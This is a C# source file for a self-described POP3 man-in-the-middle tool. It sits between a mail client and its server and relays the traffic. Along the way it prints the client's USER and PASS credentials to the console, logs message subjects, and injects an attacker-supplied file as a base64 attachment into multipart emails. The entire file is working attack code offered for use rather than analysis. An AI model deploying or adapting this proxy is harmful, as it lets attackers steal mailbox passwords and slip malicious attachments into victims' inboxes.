using System;
using System.Text;
using System.Threading;
using System.IO;
using System.Net;
using System.Net.Sockets;

namespace Zcg.Tests
{
    class PopFuckProxy
    {

        enum state
        {
            header,
            replace
        }
        static string fn = "";
        static string b64 = "";

        static void Main(string[] args)
        {
            Console.WriteLine("POP3 MITM tool v0.1");
            Console.WriteLine("Part of GMH's fuck Tools, Code By zcgonvh.\r\n");
            try
            {
                if (args.Length > 4)
                {
                    fn = args[4];
                    b64 = Convert.ToBase64String(File.ReadAllBytes(fn), Base64FormattingOptions.InsertLineBreaks);
                    fn=Path.GetFileName(fn);
                }
                TcpListener tl = new TcpListener(IPAddress.Parse(args[0]), int.Parse(args[1]));
                tl.Start();
                while (true)
                {
                    NetworkStream nsc = tl.AcceptTcpClient().GetStream();
                    TcpClient tc = new TcpClient();
                    tc.Connect(args[2], int.Parse(args[3]));
                    NetworkStream nss = tc.GetStream();
                    new Thread(Read).Start(new object[] { nsc, nss });
                    new Thread(Write).Start(new object[] { nsc, nss });
                }
            }
            catch (Exception ex)
            {
                if (ex is IndexOutOfRangeException || ex is FormatException)
                {
                    Console.WriteLine("usage: PopFuckProxy <lhost> <lport> <rhost> <rport> [attachment]");
                }
                else
                {
                    Console.WriteLine(ex);
                }
            }
        }
        static void Read(object o)
        {
            try
            {
                object[] obj = o as object[];
                NetworkStream nsc = obj[0] as NetworkStream;
                NetworkStream nss = obj[1] as NetworkStream;
                StreamReader sr = new StreamReader(nsc);
                StreamWriter sw = new StreamWriter(nss);
                sw.AutoFlush = true;
                string s = sr.ReadLine();
                while (s != null)
                {
                    if (s.StartsWith("USER"))
                    {
                        Console.WriteLine("[!] " + s);
                    }
                    else if (s.StartsWith("PASS"))
                    {
                        Console.WriteLine("[!] " + s);
                    }
                    sw.WriteLine(s);
                    s = sr.ReadLine();
                }
            }
            catch { }
        }
        static void Write(object o)
        {
            try
            {
                object[] obj = o as object[];
                NetworkStream nsc = obj[0] as NetworkStream;
                NetworkStream nss = obj[1] as NetworkStream;
                StreamWriter sw = new StreamWriter(nsc);
                sw.AutoFlush = true;
                StreamReader sr = new StreamReader(nss);
                state stat = state.header;
                string boundary = "";
                string boundarye = "";
                string s = sr.ReadLine();
                while (s != null)
                {
                    switch (stat)
                    {
                        case state.header:
                            {
                                if (boundarye != "" && s == "")
                                {
                                    stat = state.replace;
                                }
                                else if (s.StartsWith("Content-Type") && s.IndexOf("multipart/") > 0)
                                {
                                    if (s.IndexOf("multipart/alternative") > 0)
                                    {
                                        s = s.Replace("multipart/alternative", "multipart/relative");
                                    }
                                    if (s.IndexOf("boundary=") < 0)
                                    {
                                        sw.WriteLine(s);
                                        s = sr.ReadLine();
                                    }
                                    var arr = s.Split(new string[] { "boundary=" }, 2, StringSplitOptions.RemoveEmptyEntries);
                                    if (arr.Length == 2)
                                    {
                                        boundary = "--" + arr[1].Trim(' ', '\t', '\'', '"');
                                        boundarye = boundary + "--";
                                        stat = state.replace;
                                    }
                                }
                                else if (s.StartsWith("Subject"))
                                {
                                    Console.WriteLine("[+] " + s);
                                }
                                sw.WriteLine(s);
                                break;
                            }
                        case state.replace:
                            {
                                if (s == boundarye && fn != "")
                                {
                                    sw.WriteLine(boundary);
                                    sw.WriteLine("Content-Type: application/octet-stream;");
                                    sw.WriteLine("	charset=\"utf-8\";");
                                    sw.WriteLine("	name=\"" + System.Web.HttpUtility.UrlEncode(fn,Encoding.UTF8) + "\"");
                                    sw.WriteLine("Content-Disposition: attachment; filename=\"" + System.Web.HttpUtility.UrlEncode(fn,Encoding.UTF8) + "\"");
                                    sw.WriteLine("Content-Transfer-Encoding: base64");
                                    sw.WriteLine();
                                    sw.WriteLine(b64);
                                    sw.WriteLine(boundarye);
                                    stat = state.header;
                                    boundarye = "";
                                    Console.WriteLine("[!] Attachment added!");
                                }
                                else
                                {
                                    sw.WriteLine(s);
                                }
                                break;
                            }
                    }
                    s = sr.ReadLine();
                }
            }
            catch { }
        }
    }
}